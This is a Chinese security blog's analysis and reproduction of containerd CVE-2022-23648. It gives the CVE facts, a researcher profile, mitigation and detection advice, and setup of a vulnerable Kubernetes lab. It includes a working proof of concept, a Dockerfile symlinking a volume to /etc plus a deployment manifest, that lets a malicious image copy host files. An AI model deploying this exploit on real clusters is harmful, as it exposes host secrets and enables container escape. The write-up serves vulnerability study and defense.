<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="ie=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="author"
    content="">
<meta name="description"
    content="tags: cve,漏洞分析 containerd CVE-2022-23648 分析与复现  note: 本文写作时，为2022年3月7日。写作时未发现任何漏洞详细信息。  一、基本信息    Item Details Note     Project https://github.com/containerd/containerd    Publish Date 2022-03-03    Confirm Link GHSA-crp2-qrr5-8pq7    CVE-ID CVE-2022-23648 GHSA, NVD, mitre, cvedetails   EDB-ID 无    Exploits ssst0n3/cve-2022-23648:etc    Affect Version &amp;lt;= 1.4.12, 1.5.0 - 1.5.9, 1.6.0    Fix Version 1.6.1, 1." />
<meta name="keywords" content="" />
<meta name="robots" content="noodp" />
<link rel="canonical" href="/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/%E8%BF%9B%E7%A8%8B%E5%AE%B9%E5%99%A8/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%B9%E5%99%A8/containerd/%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/CVE-2022-23648/%E5%88%86%E6%9E%90/containerd-CVE-2022-23648-%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0.html" />


<title>
    
    containerd CVE-2022-23648 分析与复现 :: welcome to st0n3&#39;s blog 
    
</title>



<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.2.1/css/flag-icon.min.css" rel="stylesheet"
    type="text/css">



<link rel="stylesheet" href="/main.min.de959d61dd13c2cd41136acd491ffb0749779e1afe37b1fed6d5cba0b7e1938d.css">



<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
<link rel="manifest" href="/site.webmanifest">
<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#252627">
<link rel="shortcut icon" href="/favicon.ico">
<meta name="theme-color" content="#252627"><meta itemprop="name" content="containerd CVE-2022-23648 分析与复现">
<meta itemprop="description" content="tags: cve,漏洞分析 containerd CVE-2022-23648 分析与复现  note: 本文写作时，为2022年3月7日。写作时未发现任何漏洞详细信息。  一、基本信息    Item Details Note     Project https://github.com/containerd/containerd    Publish Date 2022-03-03    Confirm Link GHSA-crp2-qrr5-8pq7    CVE-ID CVE-2022-23648 GHSA, NVD, mitre, cvedetails   EDB-ID 无    Exploits ssst0n3/cve-2022-23648:etc    Affect Version &lt;= 1.4.12, 1.5.0 - 1.5.9, 1.6.0    Fix Version 1.6.1, 1.">
<meta itemprop="datePublished" content="2022-03-29T10:01:38+00:00" />
<meta itemprop="dateModified" content="2022-03-29T10:01:38+00:00" />
<meta itemprop="wordCount" content="2005">



<meta itemprop="keywords" content="" />
<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="containerd CVE-2022-23648 分析与复现"/>
<meta name="twitter:description" content="tags: cve,漏洞分析 containerd CVE-2022-23648 分析与复现  note: 本文写作时，为2022年3月7日。写作时未发现任何漏洞详细信息。  一、基本信息    Item Details Note     Project https://github.com/containerd/containerd    Publish Date 2022-03-03    Confirm Link GHSA-crp2-qrr5-8pq7    CVE-ID CVE-2022-23648 GHSA, NVD, mitre, cvedetails   EDB-ID 无    Exploits ssst0n3/cve-2022-23648:etc    Affect Version &lt;= 1.4.12, 1.5.0 - 1.5.9, 1.6.0    Fix Version 1.6.1, 1."/>




<meta property="article:published_time" content="2022-03-29 10:01:38 &#43;0000 UTC" />







    </head>

    <body class="dark-theme">
        <div class="container">
            <header class="header">
    <span class="header__inner">
        <a href="/" style="text-decoration: none;">
    <div class="logo">
        
            <span class="logo__mark">></span>
            <span class="logo__text">$ cd /home/st0n3</span>
            <span class="logo__cursor"></span>
        
    </div>
</a>


        <span class="header__right">
            
                <nav class="menu">
    <ul class="menu__inner"><li><a href="/aboutme.html">About</a></li><li><a href="/post.html">Blog</a></li><li><a href="/hackerbot">Hackerbot</a></li><li><a href="/skill_tree/">SkillTree</a></li>
    </ul>
</nav>

                <span class="menu-trigger">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                        <path d="M0 0h24v24H0z" fill="none"/>
                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
                    </svg>
                </span>
            

            <span class="theme-toggle"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
</svg>
</span>
        </span>
    </span>
</header>


            <div class="content">
                
    <main class="post">

        <div class="post-info">
            
            </p>
        </div>

        <article>
            <h2 class="post-title"><a href="/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/%E8%BF%9B%E7%A8%8B%E5%AE%B9%E5%99%A8/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%B9%E5%99%A8/containerd/%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/CVE-2022-23648/%E5%88%86%E6%9E%90/containerd-CVE-2022-23648-%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0.html">containerd CVE-2022-23648 分析与复现</a></h2>

            

            <div class="post-content">
                <hr>
<h2 id="tags-cve漏洞分析">tags: cve,漏洞分析</h2>
<h1 id="containerd-cve-2022-23648-分析与复现">containerd CVE-2022-23648 分析与复现</h1>
<small>
note: 本文写作时，为2022年3月7日。写作时未发现任何漏洞详细信息。
</small>
<h2 id="一基本信息">一、基本信息</h2>
<table>
<thead>
<tr>
<th>Item</th>
<th>Details</th>
<th>Note</th>
</tr>
</thead>
<tbody>
<tr>
<td>Project</td>
<td><a href="https://github.com/containerd/containerd">https://github.com/containerd/containerd</a></td>
<td></td>
</tr>
<tr>
<td>Publish Date</td>
<td>2022-03-03</td>
<td></td>
</tr>
<tr>
<td>Confirm Link</td>
<td><a href="https://github.com/containerd/containerd/security/advisories/GHSA-crp2-qrr5-8pq7">GHSA-crp2-qrr5-8pq7</a></td>
<td></td>
</tr>
<tr>
<td>CVE-ID</td>
<td>CVE-2022-23648</td>
<td><a href="https://github.com/containerd/containerd/security/advisories/GHSA-crp2-qrr5-8pq7">GHSA</a>, <a href="https://nvd.nist.gov/vuln/detail/CVE-2022-23648">NVD</a>, <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23648">mitre</a>, <a href="https://www.cvedetails.com/cve/CVE-2022-23648/?q=CVE-2022-23648">cvedetails</a></td>
</tr>
<tr>
<td>EDB-ID</td>
<td>无</td>
<td></td>
</tr>
<tr>
<td>Exploits</td>
<td>ssst0n3/cve-2022-23648:etc</td>
<td></td>
</tr>
<tr>
<td>Affect Version</td>
<td>&lt;= 1.4.12, 1.5.0 - 1.5.9, 1.6.0</td>
<td></td>
</tr>
<tr>
<td>Fix Version</td>
<td>1.6.1, 1.5.10 and 1.4.13</td>
<td></td>
</tr>
<tr>
<td>Fix Commit</td>
<td><a href="https://github.com/containerd/containerd/commit/075cfdff68941fe30338ebe034fa67ce09fb4b55">containerd/containerd@075cfdf</a></td>
<td></td>
</tr>
<tr>
<td>CVSS</td>
<td>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N</td>
<td></td>
</tr>
<tr>
<td>Vuln&rsquo;s Author</td>
<td>Felix Wilhelm@Google Project Zero</td>
<td><a href="https://github.com/felixwilhelm">github</a></td>
</tr>
<tr>
<td>Author&rsquo;s Report</td>
<td><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2244">/project-zero/issues@2244</a></td>
<td></td>
</tr>
</tbody>
</table>
<h2 id="二组件简介">二、组件简介</h2>
<p>containerd被众多容器软件使用，包括k8s, docker, kata, linuxkit等，是行业的事实标准。containerd可以管理容器的完整生命周期，包括镜像传输和存储、容器执行和管理、存储和网络等。</p>
<p>更多信息参见<a href="containerd.io">containerd官网</a>和<a href="github.com/containerd/containerd">github项目主页</a>。</p>
<h2 id="三漏洞作者">三、漏洞作者</h2>
<p>Felix Wilhelm 是 Google Project Zero 的 云安全研究员, 在容器领域挖掘过多个漏洞，同时也是cgroup release_agent逃逸手法的提出者。</p>
<table>
<thead>
<tr>
<th>Item</th>
<th>Link</th>
</tr>
</thead>
<tbody>
<tr>
<td>Author</td>
<td>Felix Wilhelm</td>
</tr>
<tr>
<td>Organization</td>
<td>Google Project Zero</td>
</tr>
<tr>
<td></td>
<td>ERNW</td>
</tr>
<tr>
<td>github</td>
<td><a href="https://github.com/felixwilhelm">https://github.com/felixwilhelm</a></td>
</tr>
<tr>
<td>email</td>
<td><a href="mailto:fwilhelm@google.com">fwilhelm@google.com</a></td>
</tr>
<tr>
<td>twitter</td>
<td><a href="https://twitter.com/_fel1x">@_fel1x</a></td>
</tr>
<tr>
<td>hackerone</td>
<td><a href="https://hackerone.com/fwilhelm?type=user">https://hackerone.com/fwilhelm?type=user</a></td>
</tr>
<tr>
<td>crunchbase</td>
<td><a href="https://www.crunchbase.com/person/felix-wilhelm">https://www.crunchbase.com/person/felix-wilhelm</a></td>
</tr>
<tr>
<td>linkedin</td>
<td>(not visible) <a href="https://www.linkedin.cn/injobs/in/felix-wilhelm-298984133">https://www.linkedin.cn/injobs/in/felix-wilhelm-298984133</a></td>
</tr>
<tr>
<td>rocketreach</td>
<td><a href="https://rocketreach.co/felix-wilhelm-email_46960220">https://rocketreach.co/felix-wilhelm-email_46960220</a></td>
</tr>
<tr>
<td>cve</td>
<td><a href="https://bugs.chromium.org/p/project-zero/issues/list?q=owner%3Afwilhelm%40google.com&amp;can=1">owner:fwilhelm@google.com under project zero</a></td>
</tr>
<tr>
<td></td>
<td><a href="https://packetstormsecurity.com/files/author/15107/">author Felix Wilhelm under packetstorm</a></td>
</tr>
<tr>
<td></td>
<td><a href="https://github.com/advisories/GHSA-crp2-qrr5-8pq7">containerd CVE-2022-23648</a></td>
</tr>
<tr>
<td></td>
<td><a href="https://github.com/advisories/GHSA-v95c-p5hm-xq8f">runc CVE-2021-43784</a></td>
</tr>
<tr>
<td></td>
<td><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2066&amp;q=owner%3Afwilhelm%40google.com&amp;can=1">Kubernetes: Multiple issues in aws-iam-authenticator</a></td>
</tr>
<tr>
<td></td>
<td><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2154">Terminal escape injection in AWS CloudShell</a></td>
</tr>
<tr>
<td></td>
<td><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2163">Sublime Package Control: Arbitrary File Write on packagecontrol.io</a></td>
</tr>
<tr>
<td></td>
<td>git <a href="https://github.com/git/git/security/advisories/GHSA-qm7j-c969-7j4q">CVE-2020-5260</a>,<a href="https://answers.launchpad.net/debian/+source/git/1%3A2.20.1-2+deb10u3/">CVE-2020-11008</a></td>
</tr>
<tr>
<td></td>
<td>KVM <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29657">CVE-2021-29657</a>,<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-4093">CVE-2021-4093</a>,<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE%2D2019%2D7222">CVE-2019-7222</a>,<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE%2D2019%2D7221">CVE-2019-7221</a>,<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-12904">CVE-2018-12904</a></td>
</tr>
<tr>
<td></td>
<td>F5 Big IP <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-22992">CVE-2021-22992</a>,<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-22991">CVE-2021-22991</a></td>
</tr>
<tr>
<td></td>
<td>Apache HTTP Server <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-9490">CVE-2020-9490</a>,<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11984">CVE-2020-11984</a>,<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11993">CVE-2020-11993</a></td>
</tr>
<tr>
<td></td>
<td>Node.js <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-8265">CVE-2020-8265</a>,<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-8172">CVE-2020-8172</a></td>
</tr>
<tr>
<td></td>
<td>usrsctp <a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2090&amp;q=reporter%3Afwilhelm%40google.com&amp;can=1">Insecure HMAC generation leads to OOB access</a>, <a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2091&amp;q=reporter%3Afwilhelm%40google.com&amp;can=1">pending_reply_queue OOB access</a></td>
</tr>
<tr>
<td></td>
<td>GitHub <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-15228">CVE-2020-15228</a></td>
</tr>
<tr>
<td></td>
<td>HashiCorp Vault <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-16251">CVE-2020-16251</a>,<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-16250">CVE-2020-16251</a></td>
</tr>
<tr>
<td></td>
<td><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11100">haproxy CVE-2020-11100</a></td>
</tr>
<tr>
<td></td>
<td><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-1111">NetworkManager/DHCP CVE-2018-1111</a></td>
</tr>
<tr>
<td></td>
<td><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-1000083">GNOME/evince CVE-2017-1000083</a></td>
</tr>
<tr>
<td></td>
<td><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE%2D2018%2D15471">Xen CVE-2018-15471</a></td>
</tr>
<tr>
<td></td>
<td><a href="https://packetstormsecurity.com/files/138969/EMC-Replication-Manager-Network-Module-Remote-Code-Execution.html">EMC CVE-2016-0913</a></td>
</tr>
<tr>
<td></td>
<td><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2013-0156">Ruby CVE-2013-0156</a></td>
</tr>
<tr>
<td></td>
<td><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-4335">CakePHP CVE-2010-4335</a></td>
</tr>
<tr>
<td>presents</td>
<td><a href="https://conference.hitb.org/hitbsecconf2018dxb/sessions/dhcp-is-hard/">HITB-2018: DHCP Is Hard</a></td>
</tr>
<tr>
<td></td>
<td><a href="https://www.blackhat.com/us-16/briefings.html#xenpwn-breaking-paravirtualized-devices">blackhat/us-16: XENPWN: BREAKING PARAVIRTUALIZED DEVICES</a></td>
</tr>
<tr>
<td></td>
<td><a href="https://44con.com/44con/44con-london-2015/44con-london-2015-presentations/">44con/london-2015: Playing with Fire: Attacking the FireEye MPS</a>, <a href="https://gsec.hitb.org/materials/sg2015/D3%20-%20Felix%20Wilhelm%20-%20Attacking%20the%20FireEye%20MPS.pdf">pdf</a></td>
</tr>
<tr>
<td>blog</td>
<td><a href="https://googleprojectzero.blogspot.com/2021/06/an-epyc-escape-case-study-of-kvm.html">An EPYC escape: Case-study of a KVM breakout</a></td>
</tr>
<tr>
<td></td>
<td><a href="https://googleprojectzero.blogspot.com/2020/10/enter-the-vault-auth-issues-hashicorp-vault.html">Enter the Vault: Authentication Issues in HashiCorp Vault</a></td>
</tr>
<tr>
<td></td>
<td><a href="https://insinuator.net/author/fwilhelm/">FELIX WILHELM&rsquo;s blogs at ENRW</a></td>
</tr>
<tr>
<td>other</td>
<td><a href="https://twitter.com/_fel1x/status/1151487051986087936">publicly presented the first container escape using release_agent</a></td>
</tr>
</tbody>
</table>
<h2 id="四漏洞详情">四、漏洞详情</h2>
<h3 id="1-介绍">1. 介绍</h3>
<p>通过containerd的CRI实现部署一个恶意镜像容器时，可以获得主机上任意文件和目录的只读副本。这可能会绕过任何基于策略的容器安全机制（包括Kubernetes Pod安全策略），并暴露出潜在的敏感信息。Kubernetes和crictl都可以被配置为使用containerd的CRI实现。</p>
<h3 id="2-影响">2. 影响</h3>
<h4 id="21-范围">2.1 范围</h4>
<p>&lt;= 1.4.12, 1.5.0 - 1.5.9, 1.6.0</p>
<h4 id="22-危害">2.2 危害</h4>
<p>可以读取宿主机任意文件，而宿主机上可能包括允许容器逃逸的敏感信息。</p>
<h4 id="23-利用场景">2.3 利用场景</h4>
<p>影响k8s/crictl+containerd，而k8s+docker或docker+containerd场景不受影响</p>
<h2 id="五防御">五、防御</h2>
<h3 id="1-修复建议">1. 修复建议</h3>
<p>升级containerd至最新版本。</p>
<h3 id="2-规避措施">2. 规避措施</h3>
<p>如果不方便升级containerd版本，则应限制用户运行自定义镜像。</p>
<h3 id="3-检测">3. 检测</h3>
<p>因为复制宿主机文件的操作由containerd执行，因此只能从行为层面检测。</p>
<p>可以通过检测containerd复制宿主机操作系统关键文件的行为，判定该漏洞是否被利用。</p>
<h2 id="六漏洞复现">六、漏洞复现</h2>
<h3 id="1-复现环境">1. 复现环境</h3>
<h4 id="11-docker-archive-镜像">1.1 docker-archive 镜像</h4>
<p>我已经将存在漏洞的环境打包成了<a href="https://github.com/ssst0n3/docker_archive/tree/branch_ubuntu-20.04_kubernetes-1.23.4_containerd.io-1.4.12-1_calico-3.22.1">docker-archive</a>镜像，可以直接使用。</p>
<pre><code>docker run --privileged -d -p 2222:22 -ti ssst0n3/docker_archive:ubuntu-20.04_kubernetes-1.23.4_containerd.io-1.4.12-1_calico-3.22.1 /start_vm.sh -enable-kvm
ssh -p 2222 root@127.0.0.1
root@127.0.0.1's password: root
root@ubuntu:~# /wait-for.sh
</code></pre><p>如果你的环境不支持kvm，可以直接运行镜像，但可能会有点慢。</p>
<pre><code>docker run -d -p 2222:22 -ti ssst0n3/docker_archive:ubuntu-20.04_kubernetes-1.23.4_containerd.io-1.4.12-1_calico-3.22.1
ssh -p 2222 root@127.0.0.1
root@127.0.0.1's password: root
root@ubuntu:~# /wait-for.sh
</code></pre><p>如果你希望自行搭建环境，可以参照下文 1.2 手动安装 的步骤执行。</p>
<h4 id="12-手动安装">1.2 手动安装</h4>
<p>找一台linux主机(这里以ubuntu20.04为例), 参考<a href="https://kubernetes.io/zh/docs/setup/production-environment/tools/kubeadm/install-kubeadm/">k8s官方安装文档</a>安装k8s+containerd。</p>
<h5 id="121-安装containerd">1.2.1 安装containerd</h5>
<p><a href="https://kubernetes.io/zh/docs/setup/production-environment/container-runtimes/#containerd">https://kubernetes.io/zh/docs/setup/production-environment/container-runtimes/#containerd</a></p>
<p>安装和配置的先决条件：</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">cat <span style="color:#e6db74">&lt;&lt;EOF | sudo tee /etc/modules-load.d/containerd.conf
</span><span style="color:#e6db74">overlay
</span><span style="color:#e6db74">br_netfilter
</span><span style="color:#e6db74">EOF</span>

sudo modprobe overlay
sudo modprobe br_netfilter

<span style="color:#75715e"># 设置必需的 sysctl 参数，这些参数在重新启动后仍然存在。</span>
cat <span style="color:#e6db74">&lt;&lt;EOF | sudo tee /etc/sysctl.d/99-kubernetes-cri.conf
</span><span style="color:#e6db74">net.bridge.bridge-nf-call-iptables  = 1
</span><span style="color:#e6db74">net.ipv4.ip_forward                 = 1
</span><span style="color:#e6db74">net.bridge.bridge-nf-call-ip6tables = 1
</span><span style="color:#e6db74">EOF</span>

<span style="color:#75715e"># 应用 sysctl 参数而无需重新启动</span>
sudo sysctl --system
</code></pre></div><p>参考<a href="https://docs.docker.com/engine/install/ubuntu/">docker官方安装文档</a> 安装 <code>containerd.io</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">apt-get update
apt-get install ca-certificates curl gnupg lsb-release
curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg
echo <span style="color:#ae81ff">\
</span><span style="color:#ae81ff"></span>  <span style="color:#e6db74">&#34;deb [arch=</span><span style="color:#66d9ef">$(</span>dpkg --print-architecture<span style="color:#66d9ef">)</span><span style="color:#e6db74"> signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/ubuntu \
</span><span style="color:#e6db74">  </span><span style="color:#66d9ef">$(</span>lsb_release -cs<span style="color:#66d9ef">)</span><span style="color:#e6db74"> stable&#34;</span> | sudo tee /etc/apt/sources.list.d/docker.list &gt; /dev/null
apt-get update
</code></pre></div><p>查询 <code>containerd.io</code> 版本, 选择存在漏洞的版本</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#75715e"># apt-cache madison containerd.io</span>
containerd.io |   1.4.13-1 | https://download.docker.com/linux/ubuntu focal/stable amd64 Packages
containerd.io |   1.4.12-1 | https://download.docker.com/linux/ubuntu focal/stable amd64 Packages
...
</code></pre></div><p>因为1.4.13是修复版本，所以我们选择1.4.12-1</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">apt-get install -y containerd.io<span style="color:#f92672">=</span>1.4.12-1
</code></pre></div><p>配置containerd</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">sudo mkdir -p /etc/containerd
containerd config default | sudo tee /etc/containerd/config.toml
sed -i <span style="color:#e6db74">&#39;/\[plugins\.&#34;io\.containerd\.grpc\.v1\.cri&#34;\.containerd\.runtimes\.runc\.options\]/a SystemdCgroup = true&#39;</span> /etc/containerd/config.toml
sudo systemctl restart containerd
</code></pre></div><h5 id="122-安装kubernetes">1.2.2 安装kubernetes</h5>
<pre><code>sudo apt-get update
sudo apt-get install -y apt-transport-https ca-certificates curl
sudo curl -fsSLo /usr/share/keyrings/kubernetes-archive-keyring.gpg https://packages.cloud.google.com/apt/doc/apt-key.gpg
echo &quot;deb [signed-by=/usr/share/keyrings/kubernetes-archive-keyring.gpg] https://apt.kubernetes.io/ kubernetes-xenial main&quot; | sudo tee /etc/apt/sources.list.d/kubernetes.list
sudo apt-get update
sudo apt-get install -y kubelet kubeadm kubectl
</code></pre><h5 id="123-初始化集群并安装cni">1.2.3 初始化集群并安装cni</h5>
<p><a href="https://docs.projectcalico.org/getting-started/kubernetes/quickstart">https://docs.projectcalico.org/getting-started/kubernetes/quickstart</a></p>
<pre><code>kubeadm init --pod-network-cidr=192.168.0.0/16
mkdir -p $HOME/.kube
cp -i /etc/kubernetes/admin.conf $HOME/.kube/config
chown $(id -u):$(id -g) $HOME/.kube/config
kubectl create -f https://docs.projectcalico.org/manifests/tigera-operator.yaml
kubectl create -f https://docs.projectcalico.org/manifests/custom-resources.yaml
</code></pre><p>等待calico-system容器启动</p>
<pre><code>watch kubectl get pods -n calico-system
</code></pre><p>启动完成后calico-system容器应该都为running状态</p>
<pre><code># kubectl get pods -n calico-system
NAME                                       READY   STATUS    RESTARTS   AGE
calico-kube-controllers-67f85d7449-jv9b2   1/1     Running   0          3m40s
calico-node-jfd9t                          1/1     Running   0          3m40s
calico-typha-5ff69d8599-pqj9j              1/1     Running   0          3m40s
</code></pre><p>允许在master节点部署容器</p>
<pre><code>kubectl taint nodes --all node-role.kubernetes.io/master-
</code></pre><h5 id="124-环境验证">1.2.4 环境验证</h5>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#75715e"># containerd --version</span>
containerd containerd.io 1.4.12 7b11cfaabd73bb80907dd23182b9347b4245eb5d
<span style="color:#75715e"># kubectl get pods -A</span>
NAMESPACE          NAME                                       READY   STATUS    RESTARTS   AGE
calico-apiserver   calico-apiserver-68b5698d78-6qlg2          1/1     Running   <span style="color:#ae81ff">0</span>          3m18s
calico-apiserver   calico-apiserver-68b5698d78-wggpj          1/1     Running   <span style="color:#ae81ff">0</span>          3m18s
calico-system      calico-kube-controllers-67f85d7449-jv9b2   1/1     Running   <span style="color:#ae81ff">0</span>          5m49s
calico-system      calico-node-jfd9t                          1/1     Running   <span style="color:#ae81ff">0</span>          5m49s
calico-system      calico-typha-5ff69d8599-pqj9j              1/1     Running   <span style="color:#ae81ff">0</span>          5m49s
kube-system        coredns-64897985d-fkn8c                    1/1     Running   <span style="color:#ae81ff">0</span>          6m56s
kube-system        coredns-64897985d-vq8tb                    1/1     Running   <span style="color:#ae81ff">0</span>          6m56s
kube-system        etcd-cve2022-23684                         1/1     Running   <span style="color:#ae81ff">0</span>          7m3s
kube-system        kube-apiserver-cve2022-23684               1/1     Running   <span style="color:#ae81ff">0</span>          7m3s
kube-system        kube-controller-manager-cve2022-23684      1/1     Running   <span style="color:#ae81ff">0</span>          7m3s
kube-system        kube-proxy-4bctr                           1/1     Running   <span style="color:#ae81ff">0</span>          6m56s
kube-system        kube-scheduler-cve2022-23684               1/1     Running   <span style="color:#ae81ff">0</span>          7m3s
tigera-operator    tigera-operator-b876f5799-vlxq7            1/1     Running   <span style="color:#ae81ff">0</span>          6m56s
</code></pre></div><h3 id="2-复现">2. 复现</h3>
<h4 id="21-准备恶意镜像">2.1 准备恶意镜像</h4>
<p>自行编译，或使用我已准备好的镜像 <code>ssst0n3/cve-2022-23648:etc</code></p>
<p>Dockerfile</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Dockerfile" data-lang="Dockerfile"><span style="color:#66d9ef">FROM</span><span style="color:#e6db74"> busybox</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> ln -s /etc /volume<span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">VOLUME</span><span style="color:#e6db74"> /volume</span><span style="color:#960050;background-color:#1e0010">
</span></code></pre></div><blockquote>
<p>/etc为攻击者需要读取的目录，可以改为其他目录</p>
</blockquote>
<pre><code>docker build -t ssst0n3/cve-2022-23648:etc .
docker push ssst0n3/cve-2022-23648:etc
</code></pre><h4 id="22-k8s-deployment">2.2 k8s deployment</h4>
<p>poc.yaml</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-yaml" data-lang="yaml"><span style="color:#f92672">apiVersion</span>: <span style="color:#ae81ff">apps/v1</span>
<span style="color:#f92672">kind</span>: <span style="color:#ae81ff">Deployment</span>
<span style="color:#f92672">metadata</span>:
  <span style="color:#f92672">name</span>: <span style="color:#ae81ff">demo-deployment</span>
<span style="color:#f92672">spec</span>:
  <span style="color:#f92672">selector</span>:
    <span style="color:#f92672">matchLabels</span>:
      <span style="color:#f92672">app</span>: <span style="color:#ae81ff">demo</span>
  <span style="color:#f92672">replicas</span>: <span style="color:#ae81ff">1</span>
  <span style="color:#f92672">template</span>:
    <span style="color:#f92672">metadata</span>:
      <span style="color:#f92672">labels</span>:
        <span style="color:#f92672">app</span>: <span style="color:#ae81ff">demo</span>
    <span style="color:#f92672">spec</span>:
      <span style="color:#f92672">containers</span>:
      - <span style="color:#f92672">name</span>: <span style="color:#ae81ff">demo</span>
        <span style="color:#f92672">image</span>: <span style="color:#ae81ff">ssst0n3/cve-2022-23648:etc</span>
        <span style="color:#f92672">tty</span>: <span style="color:#66d9ef">true</span>
        <span style="color:#f92672">imagePullPolicy</span>: <span style="color:#ae81ff">Always</span>
</code></pre></div><h4 id="23-验证">2.3 验证</h4>
<p>创建/etc/st0n3文件。</p>
<pre><code>touch /etc/st0n3
</code></pre><p>部署恶意容器。</p>
<pre><code>kubectl apply -f poc.yaml
</code></pre><p>等待容器启动后，进入容器验证/etc/st0n3文件是否存在，存在则攻击成功。</p>
<pre><code>pod=$(kubectl get pod -l &quot;app=demo&quot; -o jsonpath='{.items[0].metadata.name}')
kubectl wait --for=jsonpath='{.status.phase}'=Running pod/$pod --timeout=60s

kubectl exec -ti $pod -- ls -lah /etc/st0n3
-rw-r--r--    1 root     root           0 Mar 11 15:09 /etc/st0n3
</code></pre><h2 id="七漏洞分析">七、漏洞分析</h2>
<h3 id="1-漏洞点分析">1. 漏洞点分析</h3>
<p>根据<a href="https://github.com/containerd/containerd/commit/075cfdff68941fe30338ebe034fa67ce09fb4b55">漏洞修复commit</a>, 得知漏洞点位于<code>containerd/containerd/pkg/cri/opts</code>包下的<code>WithVolumes</code>函数。</p>
